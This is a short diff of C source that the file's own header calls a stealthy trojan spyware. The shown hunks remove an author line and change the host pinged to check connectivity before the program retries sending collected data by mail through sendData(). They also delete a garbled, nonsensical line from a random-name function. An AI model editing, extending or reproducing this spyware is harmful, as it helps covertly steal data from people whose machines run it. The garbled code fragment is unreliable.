@@ -1,4 +1,4 @@
-* fadliwiryawirawan 
+
 * Date: 15.Aug.2014, 28.Sep.2015
 * Comment: A Stealthy Trojan Spyware.
 **/
@@ -47,7 +47,7 @@ main(){
         while(i<3){ ///try 2 times to send data
         
             Sleep(i*MAIL_WAIT_TIME); ///wait
-            if(!system("ping www.google.co.id -n 1")){ ///check connection
+            if(!system("ping www.google.com -n 1")){ ///check connection
                 ////////////****SEND DATA****////////////
                 sendData();
 
@@ -308,6 +308,4 @@ char* getRandomName(){
     }
 
     return randomName;
-
-return hak cipta google pengembang pemilik : fadliwiryawirawan have google Indonesia US Europe Hindia 
 }
